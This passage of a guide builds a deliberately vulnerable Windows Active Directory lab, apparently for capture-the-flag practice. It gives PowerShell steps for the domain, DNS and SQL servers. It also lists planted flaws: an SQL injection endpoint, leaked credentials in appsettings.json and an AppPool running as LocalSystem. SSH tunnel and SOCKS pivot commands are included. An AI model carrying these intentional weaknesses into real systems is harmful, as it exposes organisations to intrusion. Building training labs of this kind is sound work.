- Client01 = **10.10.20.100/24**, DNS = 10.10.20.2

**VMware Network Setup**
- Create a Virtual Network Adapter named **Sentinel7 (Int.) (Host-only)** using subnet `10.10.20.0/24`
- Connect **DC01/DB01/DB02/Client01** using this internal NIC only
- **WEB01** uses two NICs:
  - NIC1: **Sentinel7 (Host-only)** for internal access
  - NIC2: **Bridged** for public internet exposure

> **Lab requirement:** From outside, open only **Port 80/443** (web) and **Port 22** (SSH tunnel) on WEB01.  
> All internal systems must be unreachable directly from outside.

---

## 1) Deploy VMs

Create VMs: **DC01, DB01, DB02, WEB01** using Windows Server 2019 and **Client01** using Windows 10.

**Set IP via PowerShell:**
```powershell
New-NetIPAddress -InterfaceAlias "<IF>" -IPAddress 10.10.20.2 -PrefixLength 24 -DefaultGateway 10.10.20.1  
Set-DnsClientServerAddress -InterfaceAlias "<IF>" -ServerAddresses 10.10.20.2
```

---

## 2) Configure DC01 (AD DS + DNS + ADFS) and Promote Domain

```powershell
Rename-Computer -NewName "SENTINEL7-DC" -Restart
Install-WindowsFeature AD-Domain-Services, DNS, ADFS-Federation -IncludeManagementTools
```

```powershell
Install-ADDSForest `
  -DomainName "sentinel7.local" `
  -DomainNetbiosName "SENTINEL7" `
  -SafeModeAdministratorPassword (Read-Host -AsSecureString "DSRM Password") `
  -InstallDns `
  -Force
```

---

## 3) DNS + Users/Groups + Join Domain

### 3.1 DNS A Records
```powershell
Add-DnsServerResourceRecordA -ZoneName "sentinel7.local" -Name "intranet" -IPv4Address 10.10.20.7  
Add-DnsServerResourceRecordA -ZoneName "sentinel7.local" -Name "dev.env.intranet" -IPv4Address 10.10.20.7  
```

### 3.2 Create OUs, Groups, Users (with sample flags/hints)

(Full script included in original Thai version.)

### 3.3 Join Domain
```powershell
Add-Computer -DomainName "sentinel7.local" -Credential "SENTINEL7\Administrator" -Restart
```

---

## 4) gMSA Setup (DC01 → DB01/DB02)

Includes:
- KDS Root Key
- Create gMSA accounts
- Install gMSA on DB01 and DB02

---

## 5) Install SQL Server 2019 Express

- Enable TCP/1433
- Assign SQL services to gMSA
- Setup firewall rules
- Enable SQL+Windows mixed authentication mode

---

## 6) Databases + Permissions + Linked Servers

- DB01 → public_db (with flags and Base64 hints)
- DB02 → secret_db (with flags)
- Linked Server from DB02 → DB01 using SQL login
- Reverse link DB01 → DB02

---

## 7) WEB01 (IIS + .NET Hosting + Vulnerable Intranet)

- Install IIS + ASP.NET Features
- Configure sites for Intranet/Dev
- Add vulnerable SQLi endpoint `/api/announce?id=1`
- Add leaked credentials in `appsettings.json`
- Run AppPool as LocalSystem (intentional LPE vuln)

---

## 8) Tunneling Enforcement (OpenSSH on WEB01)

Tunnel examples:
```bash
ssh -N -L 13389:10.10.20.100:3389 -L 11433:10.10.20.58:1433 Administrator@<WEB_PUBLIC_IP>
```

SOCKS Proxy:
```bash
ssh -N -D 1080 Administrator@<WEB_PUBLIC_IP>
```

---

## 9) Quick Validation Checklist

Includes:
- DNS tests
- Web access tests
- SQL linked tests
- gMSA status
- Firewall isolation
- Attacker POV validation

---

## 10) Security Patch Recommendations

Discusses:
- Restricting gMSA
- Using Integrated Security
- Removing SQL login mapping
- Fixing SQLi
- Restricting Dev site
- Disabling Linked Servers

---

## 11) How gMSA Works on WEB01

Explains:
- WEB01$ requests a TGT
- Retrieves gMSA managed password from KDS
- Performs Kerberos authentication to DB01/DB02
- No plaintext password required in config files

---

